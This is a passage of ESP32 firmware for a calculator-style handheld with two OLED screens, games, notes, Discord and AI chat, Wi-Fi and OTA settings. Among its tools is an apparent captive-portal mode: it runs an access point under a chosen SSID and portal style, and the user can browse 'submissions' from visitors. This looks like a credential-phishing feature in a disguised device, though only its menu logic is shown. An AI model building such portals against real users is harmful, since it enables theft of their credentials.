    case S_PORTAL_STYLE: enter(S_TOOLS); break;
    case S_PORTAL: case S_PORTAL_SUBMISSIONS: enter(S_TOOLS); break;
    case S_WIFI: case S_SAVED: case S_ABOUT: case S_OTA: case S_ERASE: enter(S_SETTINGS); break;
    case S_SCAN: enter(S_WIFI); break;
    case S_NOTES: if (notesDir != "/") { notesDir = parentDir(notesDir); enterFresh(S_NOTES); } else enter(S_TOOLS); break;
    case S_NOTEVIEW: enter(S_NOTES); break;
    case S_CLOCK: enter(S_TOOLS); break;
    case S_TIMESET: enter(S_CLOCK); break;
    case S_DCLIST: enter(S_TOOLS); break;
    case S_DCHAT: enter(S_DCLIST); break;
    case S_AI: enter(S_TOOLS); break;
    default: break;
  }
}
void listSelect() {
  if (lN == 0) return;
  memo[screen] = lSel;
  switch (screen) {
    case S_GAMES: startGame(lSel); break;
    case S_TOOLS:
      if (lSel == 0) { if (!fsOk) { toast("Storage error"); break; } notesDir = "/"; enterFresh(S_NOTES); }
      else if (lSel == 1) enter(S_CLOCK);
      else if (lSel == 2) protectedStart(S_DCLIST);
      else if (lSel == 3) protectedStart(S_AI);
      else enter(S_PORTAL_STYLE);
      break;
    case S_PORTAL_STYLE:
      portalStyle = lSel;
      startText(TP_PORTAL_SSID, "Portal SSID", "", 32, false, S_PORTAL_STYLE);
      break;
    case S_DCLIST: dcOpen(lSel); break;
    case S_SETTINGS:
      switch (lSel) {
        case 0: enter(S_WIFI); break;
        case 1: enterFresh(S_SAVED); break;
        case 2: briLevel = (briLevel + 1) % 5; prefs.putUChar("bri", briLevel); applyBrightness(); buildList(S_SETTINGS); break;
        case 3: autoOff = (autoOff + 1) % 5; prefs.putUChar("aoff", autoOff); buildList(S_SETTINGS); break;
        case 4: bootSync = !bootSync; prefs.putBool("bsync", bootSync); buildList(S_SETTINGS); break;
        case 5: startText(TP_PIN_SET, "New 4-digit PIN", "", 4, true, S_SETTINGS); break;
        case 6: enter(S_OTA); startOTA(); break;
        case 7: enter(S_ABOUT); break;
        case 8: eraseStage = 0; enter(S_ERASE); break;
      }
      break;
    case S_WIFI:
      if (lSel == 0) { doScan(); resyncKeys(); enterFresh(S_SCAN); }
      else if (lSel == 1) startText(TP_MANUAL_SSID, "Network name (SSID)", "", 32, false, S_WIFI);
      else { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); toast("Wi-Fi off"); buildList(S_WIFI); lSel = 0; }
      break;
    case S_SCAN: {
      ScanRes &r = scanRes[lSel]; String p;
      if (!r.secure) { connectWifi(r.ssid, ""); enter(S_WIFI); }
      else if (findPass(r.ssid, p)) { connectWifi(r.ssid, p); enter(S_WIFI); }
      else { pendingSsid = r.ssid; startText(TP_PASS, "Password: " + r.ssid, "", 63, true, S_SCAN); }
      break;
    }
    case S_SAVED: connectWifi(netSsid(lSel), netPass(lSel)); buildList(S_SAVED); break;
    case S_NOTES: {
      String n = lItem[lSel];
      if (n == "..") { notesDir = parentDir(notesDir); enterFresh(S_NOTES); }
      else if (n.endsWith("/")) { notesDir = joinPath(notesDir, n.substring(0, n.length() - 1)); enterFresh(S_NOTES); }
      else { openNote(joinPath(notesDir, n)); enter(S_NOTEVIEW); }
      break;
    }
    default: break;
  }
}
void listKey(uint8_t k) {
  if (k == K_LEFT) { goBack(); return; }
  if (k == K_DOWN && lN) lSel = (lSel + 1) % lN;
  else if (k == K_UP && lN) lSel = (lSel + lN - 1) % lN;
  else if (k == '=' || k == K_RIGHT) listSelect();
  else if (k == K_DEL && screen == S_SAVED && lN) {
    if (lSel < hardN) toast("Hardcoded in sketch");
    else { delNet(lSel - hardN); toast("Network forgotten"); buildList(S_SAVED); if (lSel >= lN) lSel = lN ? lN - 1 : 0; }
  }
}
void onKey(uint8_t k) {
  lastActivity = millis();
  if (screen == S_GAME) {
    if (k == K_MODE) { enter(S_GAMES); return; }
    gameKey(k); return;
  }
  dirtyA = dirtyB = true;
  if (screen == S_TEXT) { textKey(k); return; }
  if (k == K_SHIFT) { shiftOn = !shiftOn; return; }
  if (k == K_ALPHA) return;
  bool sh = shiftOn; if (SHIFT_AUTO_CLEAR) shiftOn = false;
  if (k == K_AC && sh) { goToSleep(); return; }
  if (screen == S_PORTAL && k == K_MODE) {
    portalSubmission = 0;
    portalBuildLines();
    enter(S_PORTAL_SUBMISSIONS);
    return;
  }
  if (screen == S_ERASE) {
    if (eraseStage == 1) { if (k == '=') ESP.restart(); return; }
    if (k == '=') { doErase(); return; }
    if (k == K_LEFT) { goBack(); return; }
  }
  if (k == K_MODE) { if (screen == S_CALC) enter(S_MENU); else enter(S_CALC); return; }
  switch (screen) {
    case S_CALC: calcKey(k, sh); break;
    case S_MENU:
      if (k == K_LEFT || k == K_UP) menuSel = (menuSel + 2) % 3;
      else if (k == K_RIGHT || k == K_DOWN) menuSel = (menuSel + 1) % 3;
      else if (k == '=') { enter(menuSel == 0 ? S_GAMES : menuSel == 1 ? S_TOOLS : S_SETTINGS); }
      break;
    case S_NOTEVIEW:
      if (k == K_DOWN && nvTop < (int)nvLines.size() - 7) nvTop++;
      else if (k == K_UP && nvTop > 0) nvTop--;
      else if (k == K_LEFT) goBack();
      break;
    case S_CLOCK:
      if (k == '1') enterTimeSet();
      else if (k == '2') syncViaWifi();
      else if (k == K_LEFT) goBack();
      break;
    case S_TIMESET: timeSetKey(k); break;
    case S_ABOUT: if (k == K_LEFT) goBack(); break;
    case S_OTA:
      if (k == K_LEFT) goBack(); else if (k == '=' && (otaState == OS_ERR || otaState == OS_OFF)) startOTA();
      break;
    case S_DCHAT:
      if (k == K_DOWN && dcTop < (int)dcLines.size() - 8) dcTop++;
      else if (k == K_UP && dcTop > 0) dcTop--;
      else if (k == K_LEFT) goBack();
      else if (k == '=') startText(TP_DC_MSG, "Reply: " + dcDm[dcCur].name, "", 200, false, S_DCHAT);
      else if (k == '1') {
        busyB("Refreshing..."); busyMsg("Discord", "Refreshing...");
        if (!dcFetchMsgs(false)) toast(dcErr.length() ? dcErr : String("Refresh failed"));
        resyncKeys(); dcLastPoll = millis();
      }
      break;
    case S_AI:
      if (k == K_DOWN && aiTop < (int)aiLines.size() - 8) aiTop++;
      else if (k == K_UP && aiTop > 0) aiTop--;
      else if (k == K_LEFT) goBack();
      else if (k == '=') startText(TP_AI_MSG, "Ask AI", "", 200, false, S_AI);
      break;
    case S_PORTAL_SUBMISSIONS:
      if (k == K_DOWN && portalTop < (int)portalLines.size() - 8) portalTop++;
      else if (k == K_UP && portalTop > 0) portalTop--;
      else if (k == K_RIGHT && portalSubmission + 1 < (int)portalSubmissions.size()) {
        portalSubmission++; portalBuildLines();
      } else if (k == K_LEFT) {
        if (portalSubmission > 0) { portalSubmission--; portalBuildLines(); }
        else goBack();
      }
      break;
    case S_ERASE: break;
    default: listKey(k); break;
  }
}
bool repeatable(uint8_t c) { return c == K_UP || c == K_DOWN || c == K_LEFT || c == K_RIGHT || c == K_DEL; }
void scanKeys() {
  uint32_t now = millis();
  for (int i = 0; i < NKEYS; i++) {
    bool p = readKey(KEYS[i]);
    if (p != keyRaw[i]) { keyRaw[i] = p; keyTime[i] = now; }
    else if (p != keyStable[i] && now - keyTime[i] >= DEBOUNCE_MS) {
      keyStable[i] = p;
      if (p) { keyRep[i] = now + 400; onKey(KEYS[i].code); } else keyRep[i] = 0;
    }
    if (keyStable[i] && keyRep[i] && now >= keyRep[i] && screen != S_GAME && repeatable(KEYS[i].code)) { keyRep[i] = now + 85; onKey(KEYS[i].code); }
  }
}

// ============================ BACKGROUND ============================
void background() {
  static uint32_t lastBat = 0; static int lastMin = -1, lastSec = -1; static int lastUsers = -1;
  uint32_t now = millis();
  if (notesOn || portalOn) {
    dns.processNextRequest(); server.handleClient();
    if (notesDirty) { notesDirty = false; if (screen == S_NOTES) { int s = lSel; buildList(S_NOTES); lSel = iclamp(s, 0, lN ? lN - 1 : 0); } dirtyA = dirtyB = true; }
    int u = WiFi.softAPgetStationNum(); if (u != lastUsers) {
      lastUsers = u;
      if (screen == S_NOTES || screen == S_PORTAL) dirtyB = true;
    }
  }
  if (otaBegun) ArduinoOTA.handle();
  if (toastUntil && now > toastUntil) { toastUntil = 0; dirtyA = true; }
  if (kbFlashUntil && now > kbFlashUntil) { kbFlashUntil = 0; dirtyB = true; }
  if ((screen == S_CALC || screen == S_TEXT) && now / 500 != blinkPhase) { blinkPhase = now / 500; dirtyA = true; }
  {
    struct tm t; localTm(t);
    if (t.tm_min != lastMin) { lastMin = t.tm_min; dirtyB = true; if (screen == S_CLOCK) dirtyA = true; }
    if (screen == S_CLOCK && t.tm_sec != lastSec) { lastSec = t.tm_sec; dirtyA = true; }
  }
  if (WiFi.getMode() == WIFI_OFF && now - lastBat > 10000) {
    lastBat = now; int p = batteryPercent(); if (p != batPct) { batPct = p; dirtyB = true; }
  }
  // Discord: auto refresh the open chat
  if (screen == S_DCHAT && now - dcLastCountdown >= 1000) {
    dcLastCountdown = now;
    dirtyB = true;
  }
  if (screen == S_DCHAT && WiFi.status() == WL_CONNECTED && now - dcLastPoll > 20000) {
    dcLastPoll = now;
    if (dcFetchMsgs(true)) dirtyA = dirtyB = true;
    resyncKeys();
  }
  if (autoOff && screen != S_OTA && !notesOn && !portalOn &&
      now - lastActivity > (uint32_t)AUTO_MIN[autoOff] * 60000UL) goToSleep();
}

// ============================ SETUP / LOOP ============================
void setup() {
  Serial.begin(115200);
  for (uint8_t p : PINS) pinMode(p, INPUT);
  for (int i = 0; i < NKEYS; i++) if (KEYS[i].code == K_MODE) IDX_MODE = i;

  Wire.begin(21, 22);   Wire.setClock(400000);
  Wire1.begin(16, 17);  Wire1.setClock(400000);
  if (!dA.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) Serial.println("Main OLED (21/22) not found");
  if (!dB.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) Serial.println("Info OLED (16/17) not found");
  dA.setRotation(2); dB.setRotation(2);

  prefs.begin("tuff", false);
  briLevel = prefs.getUChar("bri", 3) % 5; autoOff = prefs.getUChar("aoff", 2) % 5; bootSync = prefs.getBool("bsync", false);
  tzOffset = 0; timeIsSet = false; timeApprox = false;
  struct timeval initialClock = {FALLBACK_EPOCH, 0};
  settimeofday(&initialClock, nullptr);
  appPin = prefs.getString("apin", "0000");
  bool validStoredPin = appPin.length() == 4;
  for (unsigned i = 0; i < appPin.length(); i++) if (!isdigit((unsigned char)appPin[i])) validStoredPin = false;
  if (!validStoredPin) appPin = "0000";
  for (int i = 0; i < 4; i++) best[i] = prefs.getUShort(("hs" + String(i)).c_str(), 0);
  applyBrightness();
  randomSeed((uint32_t)esp_random());

  fsOk = LittleFS.begin(true);
  setupServer();
  for (unsigned i = 0; i < sizeof(HARD_NETS) / sizeof(HARD_NETS[0]) && hardN < 8; i++)
    if (strlen(HARD_NETS[i].ssid)) { hS[hardN] = HARD_NETS[i].ssid; hP[hardN] = HARD_NETS[i].pass; hardN++; }
  loadNets();

  resyncKeys();
  batPct = batteryPercent();
  lastActivity = millis();
  enter(S_CALC);
  renderA(); renderB(); dirtyA = dirtyB = false;    // calculator is on screen immediately

  if (bootSync && netCount()) {
    quietStartupNetworkUi = true;
    syncViaWifi();
    quietStartupNetworkUi = false;
    dirtyA = dirtyB = true;
  }
}

void loop() {
  scanKeys();
  background();
  if (screen == S_GAME) gameTick();
  if (dirtyA) { dirtyA = false; renderA(); }
  if (dirtyB) { dirtyB = false; renderB(); }
  delay(1);
}
